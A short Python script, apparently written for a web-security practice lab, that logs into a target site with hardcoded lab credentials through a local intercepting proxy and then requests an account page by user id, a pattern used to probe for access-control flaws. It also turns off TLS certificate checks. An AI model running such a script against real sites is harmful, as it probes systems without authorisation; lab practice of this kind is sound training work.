import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8087', 'https': 'http://127.0.0.1:8087'}

def auth_exploit(url, session):
    try:
        # Step 1: Perform a POST request to the login page
        data = {'username': 'carlos', 'password': 'montoya'}  # Replace with valid credentials
        res = session.post(url + "/login", data=data, proxies=proxies, verify=False)

        # Check if login was successful
        if "Incorrect" not in res.text and "Invalid" not in res.text:
            print("Login successful.")
        else:
            print("Login failed.")
            return

        # Step 2: Perform additional actions, e.g., access user account page
        user_id = data["username"]  # Replace with a valid user ID or relevant parameter
        r = session.get(f"{url}/my-account?id={user_id}", proxies=proxies, verify=False, allow_redirects=False)

        # Check if the additional action was successful
        if r.status_code == 200:
            print("Additional action successful.")
            print(r.text)
        else:
            print("Additional action failed.")
    
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    session = requests.Session()

    auth_exploit(url, session)
